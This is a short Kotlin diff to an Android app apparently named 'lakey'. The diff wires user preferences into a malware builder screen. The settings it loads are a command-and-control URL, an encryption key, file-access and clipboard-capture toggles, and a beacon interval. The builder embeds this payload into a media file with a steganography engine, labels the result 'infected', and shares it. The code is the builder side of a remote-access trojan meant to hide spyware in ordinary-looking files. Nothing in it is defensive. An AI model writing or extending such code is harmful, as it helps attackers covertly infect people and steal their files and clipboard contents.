@@ -22,6 +22,7 @@ import com.anonymousbeta.lakey.share.ShareHelper
 import com.anonymousbeta.lakey.stego.CarrierType
 import com.anonymousbeta.lakey.stego.StegoEngine
 import com.anonymousbeta.lakey.ui.theme.*
+import com.anonymousbeta.lakey.utils.Prefs
 import kotlinx.coroutines.launch
 
 @Composable
@@ -30,6 +31,7 @@ fun BuilderScreen() {
     val scope = rememberCoroutineScope()
     val stegoEngine = remember { StegoEngine(context) }
     val shareHelper = remember { ShareHelper(context) }
+    val prefs = remember { Prefs(context) }
 
     var selectedUri by remember { mutableStateOf<Uri?>(null) }
     var carrierType by remember { mutableStateOf<CarrierType?>(null) }
@@ -111,7 +113,13 @@ fun BuilderScreen() {
                 status = "Embedding payload..."
                 scope.launch {
                     try {
-                        val config = PayloadConfig() // load from settings later
+                        val config = PayloadConfig(
+                            c2Url = prefs.c2Url,
+                            encryptionKey = prefs.encryptionKey,
+                            enableFileAccess = prefs.enableFileAccess,
+                            enableClipboard = prefs.enableClipboard,
+                            beaconIntervalSeconds = prefs.beaconInterval
+                        )
                         val infected = stegoEngine.embed(uri, type, config)
                         status = "Done – sharing..."
                         val mime = when (type) {
